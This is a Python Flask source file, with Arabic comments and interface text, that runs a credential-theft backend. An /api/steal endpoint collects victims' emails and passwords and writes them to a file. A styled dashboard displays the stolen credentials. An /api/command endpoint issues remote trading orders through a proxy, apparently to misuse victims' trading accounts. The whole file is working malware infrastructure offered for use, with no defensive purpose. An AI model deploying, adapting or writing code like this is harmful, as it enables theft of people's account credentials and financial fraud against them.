import os
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# ملف تخزين البيانات (مؤقت)
DATA_FILE = "stolen_sessions.txt"

# قالب HTML للوحة التحكم
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - السيطرة</title>
    <style>
        body { background-color: #030305; color: #00E5FF; font-family: 'Cairo', sans-serif; padding: 20px; }
        h1 { color: #FFD700; text-align: center; text-shadow: 0 0 10px #FFD700; }
        .card { background-color: #0E0E14; border: 1px solid #00E5FF; border-radius: 10px; padding: 15px; margin-bottom: 15px; box-shadow: 0 0 15px rgba(0, 229, 255, 0.2); }
        .email { color: #FFD700; font-weight: bold; font-size: 1.1em; }
        .password { color: #FF1744; font-family: monospace; font-size: 1.2em; }
        .btn { display: block; width: 100%; padding: 10px; text-align: center; background-color: #00E5FF; color: #000; text-decoration: none; border-radius: 5px; font-weight: bold; margin-top: 20px; }
        .btn:hover { background-color: #FFD700; }
    </style>
</head>
<body>
    <h1>🕵️ لوحة التحكم</h1>
    <div id="data-container">
        {% for item in data %}
            <div class="card">
                <div class="email">📧 الإيميل: {{ item.email }}</div>
                <div class="password">🔑 الباسورد: {{ item.password }}</div>
            </div>
        {% else %}
            <p style="text-align: center; color: #888;">لسا ما في بيانات مسروقة.. استنى شوي.</p>
        {% endfor %}
    </div>
    <a href="/" class="btn">تحديث الصفحة</a>
</body>
</html>
"""

# مسار استقبال البيانات (من التطبيق)
@app.route('/api/steal', methods=['POST'])
def steal_data():
    data = request.json
    print(f"[+] Received: {data}")
    with open(DATA_FILE, "a") as f:
        f.write(f"{data.get('email')}|{data.get('password')}\n")
    return jsonify({"status": "success"}), 200

# مسار لوحة التحكم (اللي رح تفتحو من المتصفح)
@app.route('/')
def dashboard():
    data_list = []
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            for line in f:
                if "|" in line:
                    email, password = line.strip().split("|")
                    data_list.append({"email": email, "password": password})
    # نعرض آخر 50 واحد بس عشان ما يهنق
    data_list = data_list[::-1][:50]
    return render_template_string(DASHBOARD_HTML, data=data_list)

# مسار إرسال الأوامر
@app.route('/api/command', methods=['GET'])
def get_command():
    return jsonify({
        "proxy": "http://your-proxy-ip:port",
        "action": "open_trade",
        "asset": "EURUSD",
        "amount": 10,
        "direction": "up",
        "duration": 60
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
